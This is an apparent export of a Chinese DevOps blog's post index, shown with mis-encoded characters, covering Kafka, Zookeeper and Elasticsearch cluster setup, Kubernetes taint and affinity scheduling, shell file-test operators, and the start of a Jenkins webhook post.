broker.id=0 #é…ç½®ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œlistener_name://host_name:port listeners=PLAINTEXT://elk1:9092 #topicä¸å­˜åœ¨æ—¶ï¼Œæ˜¯å¦è‡ªåŠ¨åˆ›å»ºtopic auto.create.topics.enable=true #æ­¤é¡¹è®¾ç½®ä¸ºtrueï¼Œåˆ é™¤topicæ—¶ä¼šçœŸæ­£åˆ é™¤ï¼Œè®¾ç½®ä¸ºflaseåªæ˜¯æ ‡è®°åˆ é™¤ delete.topic.enable=true #æ—¥å¿—å’ŒæŒä¹…åŒ–æ•°æ®ç›®å½•ï¼ŒæŒ‡å®šå¤šè·¯å¾„ä½¿ç”¨é€—å·åˆ†å‰² log.dirs=/tmp/kafka-logs #partitionsæ•°é‡å»ºè®®å¤§äºç­‰äºæ¶ˆè´¹è€…æ•°é‡ num.partitions=6 #ä¿ç•™kafkaä¸­æ¶ˆæ¯çš„æ—¶é—´ log.retention.hours=168 #topicçš„partitionæ˜¯ä»¥ä¸€å †segmentæ–‡ä»¶å­˜å‚¨çš„ï¼Œè¿™ä¸ªæ§åˆ¶æ¯ä¸ªsegmentçš„å¤§å°ï¼Œä¼šè¢«topicåˆ›å»ºæ—¶çš„æŒ‡å®šå‚æ•°è¦†ç›– log.segment.bytes=1073741824 #zookeeperé›†ç¾¤è¿æ¥åœ°å€å’Œè¶…æ—¶æ—¶é—´é…ç½® zookeeper.connect=elk1:2181,elk2:2181,elk3:2181 zookeeper.connection.timeout.ms=6000 # brokerå¤„ç†æ¶ˆæ¯çš„æœ€å¤§çº¿ç¨‹æ•°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦å»ä¿®æ”¹ num.network.threads=3 # brokerå¤„ç†ç£ç›˜IOçš„çº¿ç¨‹æ•° ï¼Œæ•°å€¼åº”è¯¥å¤§äºä½ çš„ç¡¬ç›˜æ•° num.io.threads=8 #topicå‰¯æœ¬æ•°é‡ï¼Œå¦‚æœè¦éƒ¨ç½²å•æœºkafka,å°†å€¼æ”¹ä¸º1 offsets.topic.replication.factor=3 å…¶ä»–å‚æ•°è¯¦ç»†è¯´æ˜ï¼šhttps://www.cnblogs.com/alan319/p/8651434.html å¯åŠ¨kafkaï¼š cd /usr/local/kafka/bin ./kafka-server-start.sh -daemon ../config/server.properties å…¶ä»–ä¸¤å°æœºå™¨ç›¸åŒé…ç½®ï¼Œåªéœ€è¦ä¿®æ”¹broker.idå’Œlisteners. ","date":"2020-05-21 10:38","objectID":"/post/1670/:0:0","tags":["kafka","elk"],"title":"kafka2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1670/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‹è½½åœ°å€ï¼š https://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz ä¸‹è½½å®‰è£…ï¼š wget https://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz tar xf zookeeper-3.4.14.tar.gz -C /usr/local/ mv /usr/local/zookeeper-3.4.14 /usr/local/zookeeper é…ç½®ï¼š åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š cp /usr/local/zookeeper/conf/zoo_sample.cfgÂ /usr/local/zookeeper/conf/zoo.cfg ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š # æ—¶é—´å•ä½2000æ¯«ç§’ tickTime=2000 #é›†ç¾¤ä¸­çš„followeræœåŠ¡å™¨(F)ä¸leaderæœåŠ¡å™¨(L)ä¹‹é—´ åˆå§‹è¿æ¥æ—¶èƒ½å®¹å¿çš„æœ€å¤šå¿ƒè·³æ•°ï¼ˆ10*tickTimeï¼‰å³20ç§’ initLimit=10 # é›†ç¾¤ä¸­çš„followeræœåŠ¡å™¨(F)ä¸leaderæœåŠ¡å™¨(L)ä¹‹é—´ è¯·æ±‚å’Œåº”ç­”ä¹‹é—´èƒ½å®¹å¿çš„æœ€å¤šå¿ƒè·³æ•°ï¼ˆ5*tickTimeï¼‰å³10ç§’ syncLimit=5 # æ•°æ®ç›®å½•,æ²¡æœ‰é…ç½®logDirçš„è¯logä¹Ÿåœ¨æ­¤ç›®å½• dataDir=/data/zookeeper # ç›‘å¬ç«¯å£ clientPort=2181 # é›†ç¾¤å…¶ä»–èŠ‚ç‚¹ æ ¼å¼ï¼šIP:ä¸leaderèŠ‚ç‚¹é€šä¿¡çš„ç«¯å£:é€‰ä¸¾æ—¶é€šä¿¡çš„ç«¯å£ server.1=192.168.0.4:2888:3888 server.2=192.168.0.3:2888:3888 server.3=192.168.0.12:2888:3888 åˆ›å»ºæ•°æ®ç›®å½•å’Œmyidæ–‡ä»¶ï¼š mkdir /data/zookeeper # æ–‡ä»¶å†…å®¹è¦å’Œé…ç½®æ–‡ä»¶ä¸­server.1çš„1å¯¹åº” echo 1 \u003e /data/zookeeper/myid å¯åŠ¨æœåŠ¡ cd /usr/local/zookeeper/bin ./zkServer.sh start å¯åŠ¨ä¿¡æ¯å¯ä»¥åœ¨å½“å‰ç›®å½•æŸ¥çœ‹zookeeper.outæ–‡ä»¶ è¾“å…¥jpså‘½ä»¤æŸ¥çœ‹æ˜¯å¦æœ‰QuorumPeerMainï¼Œæœ‰å³ä¸ºæ­£å¸¸. å…¶ä»–ä¸¤å°ç›¸åŒé…ç½®ï¼Œåªéœ€è¦æ³¨æ„myidæ–‡ä»¶çš„å†…å®¹ ","date":"2020-05-20 19:30","objectID":"/post/1663/:0:0","tags":["zookeeper"],"title":"zookeeper-3.4.14é›†ç¾¤éƒ¨ç½²é…ç½®","uri":"/post/1663/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"Zookeeperé›†ç¾¤ä¸»è¦è§’è‰²æœ‰Serverå’Œclientï¼Œå…¶ä¸­ï¼ŒServeråˆåˆ†ä¸ºLeaderã€Followerå’ŒObserverä¸‰ä¸ªè§’è‰²ï¼Œæ¯ä¸ªè§’è‰²çš„å«ä¹‰å¦‚ä¸‹ï¼š Leaderï¼šé¢†å¯¼è€…è§’è‰²ï¼Œä¸»è¦è´Ÿè´£æŠ•ç¥¨çš„å‘èµ·å’Œå†³è®®ï¼Œä»¥åŠæ›´æ–°ç³»ç»ŸçŠ¶æ€ã€‚é›†ç¾¤ä¸­åªæœ‰ä¸€ä¸ªleaderã€‚ Followerï¼šè·Ÿéšè€…è§’è‰²ï¼Œç”¨äºæ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶è¿”å›ç»“æœç»™å®¢æˆ·ç«¯ï¼Œåœ¨é€‰ä¸¾è¿‡ç¨‹ä¸­å‚ä¸æŠ•ç¥¨ã€‚ Observerï¼šè§‚å¯Ÿè€…è§’è‰²ï¼Œç”¨æˆ·æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶å°†å†™è¯·æ±‚è½¬å‘ç»™leaderï¼ŒåŒæ—¶åŒæ­¥leaderçŠ¶æ€ï¼Œä½†ä¸å‚ä¸æŠ•ç¥¨ã€‚ Observerç›®çš„æ˜¯æ‰©å±•ç³»ç»Ÿï¼Œæé«˜ä¼¸ç¼©æ€§ã€‚ Client:å®¢æˆ·ç«¯è§’è‰²ï¼Œç”¨äºå‘Zookeeperå‘èµ·è¯·æ±‚ã€‚ Zookeeperé›†ç¾¤ä¸­æ¯ä¸ªServeråœ¨å†…å­˜ä¸­å­˜å‚¨äº†ä¸€ä»½æ•°æ®ï¼Œåœ¨Zookeeperå¯åŠ¨æ—¶ï¼Œå°†ä»å®ä¾‹ä¸­é€‰ä¸¾ä¸€ä¸ªServerä½œä¸ºleaderï¼ŒLeaderè´Ÿè´£å¤„ç†æ•°æ®æ›´æ–°ç­‰æ“ä½œï¼Œå½“ä¸”ä»…å½“å¤§å¤šæ•°Serveråœ¨å†…å­˜ä¸­æˆåŠŸä¿®æ”¹æ•°æ®ï¼Œæ‰è®¤ä¸ºæ•°æ®ä¿®æ”¹æˆåŠŸã€‚ Zookeeperå†™çš„æµç¨‹ä¸ºï¼šå®¢æˆ·ç«¯Clienté¦–å…ˆå’Œé›†ç¾¤ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹é€šä¿¡ï¼Œå‘èµ·å†™è¯·æ±‚ï¼Œå¦‚æœæ˜¯Followerï¼ŒObserverèŠ‚ç‚¹ï¼Œåˆ™ä¼šæŠŠå†™è¯·æ±‚è½¬å‘ç»™leaderï¼ŒLeaderå†å°†å†™è¯·æ±‚è½¬å‘ç»™å…¶å®ƒFollowerï¼Œå…¶å®ƒFolloweråœ¨æ¥æ”¶åˆ°å†™è¯·æ±‚åå†™å…¥æ•°æ®å¹¶å“åº”Leaderï¼ŒLeaderåœ¨æ¥æ”¶åˆ°åŠæ•°ä»¥ä¸Šå†™æˆåŠŸå›åº”åï¼Œè®¤ä¸ºæ•°æ®å†™æˆåŠŸï¼Œæœ€åå“åº”Clientï¼Œå®Œæˆä¸€æ¬¡å†™æ“ä½œè¿‡ç¨‹ã€‚ ","date":"2020-05-20 14:15","objectID":"/post/1661/:0:0","tags":["zookeeper"],"title":"zookeeperä¸­ä¸åŒè§’è‰²çš„å«ä¹‰","uri":"/post/1661/"},{"categories":["kubernetes"],"content":"å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ ‡è®°ä¸º Taints ï¼Œé™¤é pod è¢«æ ‡è¯†ä¸ºå¯ä»¥å®¹å¿æ±¡ç‚¹èŠ‚ç‚¹ï¼Œå¦åˆ™è¯¥ Taints èŠ‚ç‚¹ä¸ä¼šè¢«è°ƒåº¦ podã€‚ ä½¿ç”¨kubeadmæ­å»ºçš„k8sé›†ç¾¤ï¼Œé»˜è®¤masterèŠ‚ç‚¹æ˜¯æœ‰æ±¡ç‚¹çš„ã€‚ å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥è¯¢æ±¡ç‚¹ï¼š kubectl describe nodes test-k8s-master |grep Taints æ±¡ç‚¹çš„ç±»å‹æœ‰ä¸‰ç§ï¼š NoSchedule: æ–°çš„podä¸èƒ½è°ƒåº¦è¿‡æ¥ï¼Œä½†æ˜¯è€çš„è¿è¡Œåœ¨nodeä¸Šä¸å—å½±å“ NoExecuteï¼šæ–°çš„podä¸èƒ½è°ƒåº¦è¿‡æ¥ï¼Œè€çš„podä¹Ÿä¼šè¢«é©±é€ PreferNoScheduleï¼šå°½é‡ä¸è°ƒåº¦ æ·»åŠ ä¸€ä¸ªæ±¡ç‚¹ï¼š kubectl taint nodes node1 key1=value1:NoSchedule åˆ é™¤ä¸€ä¸ªæ±¡ç‚¹ï¼š kubectl taint nodes node1 key1:NoSchedule- pod.spec.tolerationså­—æ®µå«ä¹‰ï¼š effectï¼šæŒ‡å®šæ±¡ç‚¹ç±»å‹ã€‚ç©ºæ„å‘³ç€åŒ¹é…æ‰€æœ‰æ±¡ç‚¹ã€‚å…è®¸çš„å€¼ä¸ºNoScheduleã€PreferNoScheduleã€NoExecuteã€‚ keyï¼šæŒ‡å®šæ±¡ç‚¹çš„keyã€‚ç©ºåŒ¹é…æ‰€æœ‰æ±¡ç‚¹çš„key valueï¼šæŒ‡å®šæ±¡ç‚¹çš„value operatorï¼šEqualæ„å‘³ç€è¿™ä¸ªå€¼ç­‰äºvalueã€‚å¦‚æœæ˜¯Exists,åˆ™ä¸éœ€è¦å¡«å†™valueï¼Œåªè¦æœ‰è¿™ä¸ªkeyå°±å®¹å¿ tolerationSecondsï¼šå®¹å¿æ—¶é—´ï¼Œæ„æ€ä¸ºå¦‚æœè¢«é©±é€ï¼Œåˆ™ç­‰å¾…å®šä¹‰çš„æ—¶é—´å†å»è¢«é©±é€ï¼Œé»˜è®¤æ˜¯0ç§’ ä¸‹é¢åˆ›å»ºä¸€ä¸ªpodï¼Œåˆ©ç”¨æ±¡ç‚¹åˆ›å»ºpodåˆ°masterèŠ‚ç‚¹ä¸Šï¼š apiVersion: v1 kind: Pod metadata: name: test-nginx-pod labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: http containerPort: 80 tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule nodeSelector: kubernetes.io/hostname: master ","date":"2020-05-18 16:15","objectID":"/post/1657/:0:0","tags":["k8s"],"title":"k8sæ±¡ç‚¹å’Œå®¹å¿","uri":"/post/1657/"},{"categories":["kubernetes"],"content":"äº²å’Œæ€§è°ƒåº¦å¯ä»¥åŸºäºï¼š nodeäº²å’Œæ€§(nodeAffinity)ï¼šé€‰æ‹©è°ƒåº¦åˆ°ç›¸åŒæˆ–ä¸åŒçš„nodeèŠ‚ç‚¹ podäº²å’Œæ€§(podAffinity)ï¼šå’ŒæŸäº›podè°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹ podåäº²å’Œæ€§(podAntiAffinity)ï¼šå’ŒæŸäº›podè°ƒåº¦åœ¨ä¸åŒèŠ‚ç‚¹ ","date":"2020-05-18 14:42","objectID":"/post/1651/:1:0","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"äº²å’Œæ€§è°ƒåº¦å¯ä»¥åˆ†æˆä¸¤ç§ç­–ç•¥: ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:0","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"ç¡¬ç­–ç•¥(requiredDuringSchedulingIgnoredDuringExecution): æŒ‡å®šäº†å°† pod è°ƒåº¦åˆ°ä¸€ä¸ªèŠ‚ç‚¹ä¸Šå¿…é¡»æ»¡è¶³çš„è§„åˆ™,ä¸æ»¡è¶³åˆ™ä¼šå¤„äºpendingçŠ¶æ€ï¼Œä¸€ç›´è¿›è¡Œé‡è¯•ï¼Œç›´åˆ°æ»¡è¶³ä¸ºæ­¢ã€‚ ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:1","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"è½¯ç­–ç•¥(preferredDuringSchedulingIgnoredDuringExecution): ä¼˜å…ˆæ»¡è¶³æŒ‡å®šçš„è§„åˆ™ï¼Œå¦‚æœä¸æ»¡è¶³åˆ™ä¼šè°ƒåº¦åˆ°å…¶ä»–èŠ‚ç‚¹ä¸Šã€‚å¦‚æœæœ‰å¤šä¸ªè½¯ç­–ç•¥è¿˜å¯ä»¥è®¾ç½®ä¼˜å…ˆçº§(weight) ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:2","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"1.èŠ‚ç‚¹äº²å’Œæ€§ ä½¿ç”¨èŠ‚ç‚¹äº²å’Œæ€§ç¡¬ç­–ç•¥å°†podè°ƒåº¦åˆ° kubernetes.io/hostname æ ‡ç­¾ä¸æ˜¯test-k8s-node2çš„èŠ‚ç‚¹ä¸Šï¼Œè½¯ç­–ç•¥å°†podå°½é‡è°ƒåº¦åˆ°test-k8s-node3èŠ‚ç‚¹ä¸Š kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/hostname operator: NotIn values: - test-k8s-node2 preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: kubernetes.io/hostname operator: In values: - test-k8s-node3 \u003e operatorå¯é€‰æ“ä½œï¼š`In`,`NotIn`,`Exists`,`DoesNotExist`,`Gt`,`Lt` ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:3","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"2.podäº²å’Œæ€§ æˆ‘è¿™é‡Œçš„åŒºåŸŸæ ‡è®°æ˜¯ï¼š kubectl label nodes test-k8s-node1 zone=1 kubectl label nodes test-k8s-node3 zone=1 kubectl label nodes test-k8s-node2 zone=2 kubectl label nodes test-k8s-node4 zone=2 é¦–å…ˆæ‰¾åˆ°podä¸­åŒ…å«app=nginxèŠ‚ç‚¹ï¼ŒæŸ¥çœ‹zoneæ ‡ç­¾çš„å€¼(topologyKeyçš„ä½œç”¨)ï¼Œå‡å¦‚zone=2ï¼Œé‚£ä¹ˆè¯¥podä¼šéƒ¨ç½²åœ¨zone=2çš„åŒºåŸŸä¸­ã€‚ kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - nginx topologyKey: zone ç›´æ¥éƒ¨ç½²æ­¤æ–‡ä»¶ï¼š å‡å¤„äºpendingçŠ¶æ€ï¼Œ åˆ›å»ºä¸€ä¸ªæ ‡ç­¾ä¸ºapp=nginxçš„pod apiVersion: v1 kind: Pod metadata: name: test-nginx-pod labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: http containerPort: 80 å¯ä»¥çœ‹åˆ°è¿™ä¸ªpodè°ƒåº¦åˆ°äº†test-k8s-node1èŠ‚ç‚¹ä¸Šï¼Œnode1èŠ‚ç‚¹çš„zoneå€¼ä¸º1ï¼Œæ‰€ä»¥åˆšæ‰çš„podä¼šè°ƒåº¦åˆ°zone=1çš„èŠ‚ç‚¹ä¸Š ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:4","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"3.podåäº²å’Œæ€§ å½“å‰app=nginxçš„podè¢«è°ƒåº¦åœ¨node4èŠ‚ç‚¹ä¸Š åˆ›å»ºåäº²å’Œæ€§çš„pod kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - topologyKey: kubernetes.io/hostname labelSelector: matchExpressions: - key: app operator: In values: - nginx å¯ä»¥çœ‹åˆ°æ‰€æœ‰podéƒ½ä¸ä¼šè¢«è°ƒåº¦åˆ°node4èŠ‚ç‚¹ä¸Šäº† ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:5","tags":["k8s"],"title":"k8säº²å’Œæ€§è°ƒåº¦","uri":"/post/1651/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"1.ä¸‹è½½elasticsearch wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.8.9.tar.gz 2.è§£å‹ tar xf elasticsearch-6.8.9.tar.gz -C /usr/local/ cd /usr/local mv elasticsearch-6.8.9/ elasticsearch 3.ç³»ç»Ÿè°ƒä¼˜ 3.1 ä¿®æ”¹/etc/sysctl.conf fs.file-max=655360 vm.max_map_count = 262144 fs.file-maxä¸»è¦æ˜¯é…ç½®ç³»ç»Ÿæœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°ï¼Œå»ºè®®ä¿®æ”¹ä¸º655360æˆ–è€…æ›´é«˜ã€‚ vm.max_map_countå½±å“Javaçº¿ç¨‹æ•°é‡ï¼Œç”¨äºé™åˆ¶ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰çš„VMA(è™šæ‹Ÿå†…å­˜åŒºåŸŸ)çš„å¤§å°ï¼Œç³»ç»Ÿé»˜è®¤æ˜¯65530ï¼Œå»ºè®®ä¿®æ”¹æˆ262144æˆ–è€…æ›´é«˜ã€‚ sysctl -p ä½¿å†…æ ¸å‚æ•°é…ç½®ç”Ÿæ•ˆ 3.2 ä¿®æ”¹/etc/security/limits.conf * soft nproc 20480 * hard nproc 20480 * soft nofile 65536 * hard nofile 65536 * soft memlock unlimited * hard memlock unlimited ä¿®æ”¹/etc/security/limit.d/20-nproc.conf * soft nproc 40960 root soft nproc unlimited é€€å‡ºç»ˆç«¯,é‡æ–°è¿æ¥ä½¿é…ç½®ç”Ÿæ•ˆ 3.3 ä¿®æ”¹JVMå‚æ•° JVMè°ƒä¼˜ä¸»è¦æ˜¯é’ˆå¯¹elasticsearchçš„JVMå†…å­˜èµ„æºè¿›è¡Œä¼˜åŒ–ã€‚ elasticsearchçš„å†…å­˜èµ„æºé…ç½®æ–‡ä»¶ä¸ºjvm.optionsã€‚ä¸€èˆ¬è®¾ç½®ä¸ºæœåŠ¡å™¨ç‰©ç†å†…å­˜çš„ä¸€åŠæœ€ä½³ã€‚ vim /usr/local/elasticsearch/config/jvm.options -Xms4g -Xmx4g 4.é…ç½®esé›†ç¾¤ /usr/local/elasticsearch/config/elasticsearch.yml #é›†ç¾¤åç§° cluster.name: elkdata #å½“å‰èŠ‚ç‚¹åç§° node.name: server1 #æ˜¯å¦å¯ä»¥æˆä¸ºmasterèŠ‚ç‚¹ node.master: true #æ˜¯å¦ä¸ºæ•°æ®å­˜å‚¨èŠ‚ç‚¹ node.data: true #æ•°æ®å­˜å‚¨ç›®å½• path.data: /data1/elasticsearch,/data2/elasticsearch #æ—¥å¿—å­˜å‚¨ç›®å½• path.logs: /usr/local/elasticsearch/logs #é”å®šç‰©ç†å†…å­˜åœ°å€ï¼Œé˜²æ­¢eså†…å­˜è¢«äº¤æ¢å‡ºå»ï¼Œä¹Ÿå°±æ˜¯é¿å…esä½¿ç”¨swapäº¤æ¢åˆ†åŒºï¼Œé¢‘ç¹çš„äº¤æ¢ï¼Œä¼šå¯¼è‡´IOPSå˜é«˜ã€‚ bootstrap.memory_lock: true #ç›‘å¬åœ°å€ network.host: 0.0.0.0 #ç›‘å¬ç«¯å£ http.port: 9200 # esèŠ‚ç‚¹ä¹‹é—´çš„tcpé€šä¿¡ç«¯å£ transport.tcp.port: 9301 #è®¾ç½®é›†ç¾¤ä¸­masterèŠ‚ç‚¹çš„æœ€å°æ•°é‡ï¼Œä¸æ»¡è¶³æ—¶esé›†ç¾¤ä¼šæŠ¥é”™ã€‚æ¨èè®¾ç½®ä¸º`masterèŠ‚ç‚¹æ•°é‡/2+1`(å››èˆäº”å…¥)ï¼Œå¯è§£å†³è„‘è£‚é—®é¢˜ discovery.zen.minimum_master_nodes: 2 #èŠ‚ç‚¹ä¹‹é—´æ£€æµ‹çš„è¶…æ—¶æ—¶é—´ discovery.zen.ping_timeout: 3s #æŒ‡å®šé›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„åœ°å€ï¼Œä¸€èˆ¬åªå†™å¯ä»¥æˆä¸ºmasterçš„ discovery.zen.ping.unicast.hosts: [\"192.168.0.9:9300\",\"192.168.0.10:9300\",\"192.168.0.11:9300\"] #è§£å†³ä½¿ç”¨headæ—¶çš„è·¨åŸŸé—®é¢˜ #http.cors.allow-origin: \"*\" #http.cors.enabled: true discovery.zen.minimum_master_nodeså‚æ•°çš„æ›´è¯¦ç»†è¯´æ˜ä»¥åŠè„‘è£‚è¯´æ˜ï¼šhttps://www.cnblogs.com/zhukunrong/p/5224558.html 5.å¯åŠ¨é›†ç¾¤ 5.1 åˆ›å»ºå¯åŠ¨ç”¨æˆ·ã€æˆæƒ useradd elasticsearch chown -R elasticsearch.elasticsearch /usr/local/elasticsearch/ 5.2 åˆ›å»ºæ•°æ®ç›®å½• mkdir /data{1..2}/elasticsearch -p chown -R elasticsearch.elasticsearch /data{1..2} 5.3 å¯åŠ¨ su -s /bin/bash elasticsearch -c \"/usr/local/elasticsearch/bin/elasticsearch -d\" ","date":"2020-05-15 15:12","objectID":"/post/1646/:0:0","tags":["es","elasticsearch"],"title":"Elasticsearch 6.8.9é›†ç¾¤å®‰è£…","uri":"/post/1646/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"[ -a FILE ] å¦‚æœ FILE å­˜åœ¨åˆ™ä¸ºçœŸã€‚ [ -b FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªå—ç‰¹æ®Šæ–‡ä»¶åˆ™ä¸ºçœŸã€‚ [ -c FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªå­—ç‰¹æ®Šæ–‡ä»¶åˆ™ä¸ºçœŸã€‚ [ -d FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªç›®å½•åˆ™ä¸ºçœŸã€‚ [ -e FILE ] å¦‚æœ FILE å­˜åœ¨åˆ™ä¸ºçœŸã€‚ [ -f FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶åˆ™ä¸ºçœŸã€‚ [ -g FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”å·²ç»è®¾ç½®äº†SGIDåˆ™ä¸ºçœŸã€‚ [ -h FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªç¬¦å·è¿æ¥åˆ™ä¸ºçœŸã€‚ [ -k FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”å·²ç»è®¾ç½®äº†ç²˜åˆ¶ä½åˆ™ä¸ºçœŸã€‚ [ -p FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªåå­—ç®¡é“(Få¦‚æœO)åˆ™ä¸ºçœŸã€‚ [ -r FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯å¯è¯»çš„åˆ™ä¸ºçœŸã€‚ [ -s FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”å¤§å°ä¸ä¸º0åˆ™ä¸ºçœŸã€‚ [ -t FD ] å¦‚æœæ–‡ä»¶æè¿°ç¬¦ FD æ‰“å¼€ä¸”æŒ‡å‘ä¸€ä¸ªç»ˆç«¯åˆ™ä¸ºçœŸã€‚ [ -u FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”è®¾ç½®äº†SUID (set user ID)åˆ™ä¸ºçœŸã€‚ [ -w FILE ] å¦‚æœ FILE å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯å¯å†™çš„åˆ™ä¸ºçœŸã€‚ [ -x FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯å¯æ‰§è¡Œçš„åˆ™ä¸ºçœŸã€‚ [ -O FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”å±æœ‰æ•ˆç”¨æˆ·IDåˆ™ä¸ºçœŸã€‚ [ -G FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”å±æœ‰æ•ˆç”¨æˆ·ç»„åˆ™ä¸ºçœŸã€‚ [ -L FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªç¬¦å·è¿æ¥åˆ™ä¸ºçœŸã€‚ [ -N FILE ] å¦‚æœ FILE å­˜åœ¨ and has been modå¦‚æœied since it was last readåˆ™ä¸ºçœŸã€‚ [ -S FILE ] å¦‚æœ FILE å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªå¥—æ¥å­—åˆ™ä¸ºçœŸã€‚ [ FILE1 -nt FILE2 ] å¦‚æœ FILE1 has been changed more recently than FILE2, or å¦‚æœ FILE1 exists and FILE2 does notåˆ™ä¸ºçœŸã€‚ [ FILE1 -ot FILE2 ] å¦‚æœ FILE1 æ¯” FILE2 è¦è€, æˆ–è€… FILE2 å­˜åœ¨ä¸” FILE1 ä¸å­˜åœ¨åˆ™ä¸ºçœŸã€‚ [ FILE1 -ef FILE2 ] å¦‚æœ FILE1 å’Œ FILE2 æŒ‡å‘ç›¸åŒçš„è®¾å¤‡å’ŒèŠ‚ç‚¹å·åˆ™ä¸ºçœŸã€‚ [ -o OPTIONNAME ] å¦‚æœ shellé€‰é¡¹ â€œOPTIONNAMEâ€ å¼€å¯åˆ™ä¸ºçœŸã€‚ [ -z STRING ] â€œSTRINGâ€ çš„é•¿åº¦ä¸ºé›¶åˆ™ä¸ºçœŸã€‚ [ -n STRING ] or [ STRING ] â€œSTRINGâ€ çš„é•¿åº¦ä¸ºéé›¶ non-zeroåˆ™ä¸ºçœŸã€‚ [ STRING1 == STRING2 ] å¦‚æœ2ä¸ªå­—ç¬¦ä¸²ç›¸åŒã€‚ â€œ=â€ may be used instead of â€œ==â€ for strict POSIX complianceåˆ™ä¸ºçœŸã€‚ [ STRING1 != STRING2 ] å¦‚æœå­—ç¬¦ä¸²ä¸ç›¸ç­‰åˆ™ä¸ºçœŸã€‚ ","date":"2020-05-09 18:16","objectID":"/post/1643/:0:0","tags":["shell"],"title":"Shellä¸­åˆ¤æ–­è¯­å¥ifä¸­-zè‡³-dçš„æ„æ€","uri":"/post/1643/"},{"categories":["devops"],"content":"1.é…ç½®jenkinsï¼ˆéœ€è¦å…ˆå®‰è£…Generic Webhook Triggeræ’ä»¶ï¼‰ è·å–gitlabæäº¤çš„åˆ†æ”¯ï¼Œèµ‹ç»™å˜é‡branch åŠ ä¸€ä¸ªwebhookå‚æ•°ï¼Œç”¨äºåˆ¤æ–­è§¦å‘æ„å»ºçš„ç±»å‹ï¼š å¡«å†™tokenï¼š 